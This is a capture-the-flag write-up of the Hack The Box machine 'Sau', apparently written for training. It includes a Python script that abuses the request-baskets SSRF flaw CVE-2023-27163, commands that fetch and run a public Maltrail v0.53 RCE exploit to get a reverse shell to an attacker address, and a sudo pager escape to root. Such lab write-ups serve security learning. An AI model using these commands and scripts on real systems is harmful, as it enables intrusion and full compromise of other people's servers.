# Sau

# Hack The Box – Sau Writeup

## Overview

**Sau** is an intermediate Linux machine that focuses on **web exploitation, SSRF abuse, and privilege escalation through misconfigured sudo permissions**.
This write-up demonstrates a structured methodology: enumeration, vulnerability research, exploit adaptation, shell stabilization, and privilege escalation.

The objective was to obtain both `user.txt` and `root.txt`.

---

## 1. Enumeration

I began with a full TCP port scan:

```bash
nmap -Pn -n --min-rate 5000 -T4 <IP_TARGET>
```

Discovered open ports were then analyzed in detail:

```bash
nmap -p22,80,8338,55555 -sSCV --min-rate 5000 -T4 <IP_TARGET>
```

Key findings:

* **22** → SSH
* **80** → HTTP (internal service)
* **55555** → Web application
* **8338** → Additional service (not directly exploitable)

To fingerprint the service on port 55555:

```bash
whatweb <IP_TARGET>:55555
```

The output revealed the application **request-baskets**, and its version was visible in the footer.

---

## 2. SSRF Exploitation – CVE-2023-27163

Based on HTB’s hint and version analysis, the application was vulnerable to **SSRF (Server-Side Request Forgery)**.

Searching for:

```
CVE 2023 SSRF request-baskets
```

Led to **CVE-2023-27163**, which allows an attacker to forward requests to internal services.

### Exploit Strategy

The idea was to create a malicious basket that forwards requests to:

```
http://127.0.0.1:80
```

Below is the adapted Python script used to create the SSRF tunnel:

```python
import requests
import json
import sys

target_url = "http://<IP_VICTIMA>:55555"
internal_service = "http://127.0.0.1:80"
basket_name = "exploit-ssrf"

def create_malicious_basket():
    api_url = f"{target_url}/api/baskets/{basket_name}"
    
    payload = {
        "forward_url": internal_service,
        "proxy_response": True,
        "insecure_tls": True,
        "expand_path": True,
        "capacity": 250
    }
    
    response = requests.post(api_url, json=payload)
    
    if response.status_code == 201:
        print(f"[+] Basket '{basket_name}' created successfully.")
        print(f"[+] Access: {target_url}/{basket_name}")
    else:
        print(f"[-] Error: {response.text}")

if __name__ == "__main__":
    create_malicious_basket()
```

### How the attack works

1. A `POST` request is sent to `/api/baskets/{name}`.
2. `proxy_response: true` ensures the server returns the internal service response.
3. Accessing `/exploit-ssrf` forces the server to query `127.0.0.1:80` internally.

---

## 3. Internal Application Discovery

Through SSRF, I discovered an internal web application running on port 80:

**Maltrail v0.53**

This version is publicly known to be vulnerable to Remote Code Execution.

The exploit script was retrieved:

```bash
wget https://raw.githubusercontent.com/Rubioo02/Maltrail-v0.53-RCE/main/exploit.sh
chmod +x exploit.sh
```

Listener preparation:

```bash
nc -lvnp 4444
```

Exploit execution:

```bash
./exploit.sh -t <IP_TARGET>:55555/exploit-ssrf -i <ATTACKER_IP>
```

This successfully provided a reverse shell.

---

## 4. Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

User flag:

```bash
cat /home/puma/user.txt
```

---

## 5. Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:

```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

This is a classic privilege escalation vector.

### Version check:

```bash
systemd --version
```

Executing the allowed command:

```bash
sudo /usr/bin/systemctl status trail.service
```

This opens the pager (`less`).

Inside pager:

```
!/bin/bash
```

This spawns a root shell due to the `NOPASSWD` sudo rule.

Root flag:

```bash
cat /root/root.txt
```

---

## Key Technical Skills Demonstrated

* Structured enumeration with Nmap
* Web application fingerprinting
* CVE research and exploit adaptation
* SSRF exploitation
* Lateral movement via internal service discovery
* RCE exploitation
* Shell stabilization
* Sudo misconfiguration privilege escalation

---

## Conclusion

Sau is an excellent example of chained exploitation:

1. SSRF →
2. Internal application exposure →
3. RCE →
4. Privilege escalation via misconfigured sudo.

This machine demonstrates practical offensive security skills aligned with real-world attack paths, particularly in **web exploitation and Linux privilege escalation scenarios**.

---
